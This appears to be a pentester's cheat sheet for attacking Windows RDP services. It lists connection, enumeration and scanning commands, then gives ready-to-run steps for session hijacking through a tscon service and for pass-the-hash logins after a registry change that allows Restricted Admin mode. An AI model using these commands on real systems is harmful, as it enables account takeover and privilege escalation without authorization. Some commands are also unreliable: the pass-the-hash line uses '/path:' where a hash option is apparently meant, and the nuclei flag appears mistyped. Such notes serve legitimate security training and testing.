#complete
# Tools



**Connecting**

```bash
rdesktop -u user -p pass 10.10.10.10
```

```bash
rdesktop -u '' -p '' 10.10.10.10 

```


```bash
xfreerdp /u:user /p:password /v:ip-address

```


# Enumeration 
**RDP**** 
	- Usually on port 3389 
	- Nmap --packet trace command can be used to track individual packages and their contents manually 
	- There's a script that has been developed that can identify security settings of RDP servers
	- Installation instructions 
```bash
cpan 
install Encoding::BER
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
```

```
nuclei -u http://website.com -tag rdp 

```
# Exploitation 

## Session Hijacking 
- Lets us escalate privileges and accounts by impersonating them 
- Requirements 
	- System privileges 
	- Access to tscon.exe binary
```
whoami 

query user 

sc.exe create sessionhijack binpath= "cmd.exe /k tscon 4 /dest:rdp-tcp#13"

net start sessionhijack
```
## RDP Pass-theHash

- Requirements
	- Restricted admin mode disabled
	- New registry key added 

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:192.168.220.152 /u:lewen \
/path:300FF5E89EF33F83A8146C10F5AB9BB9

```
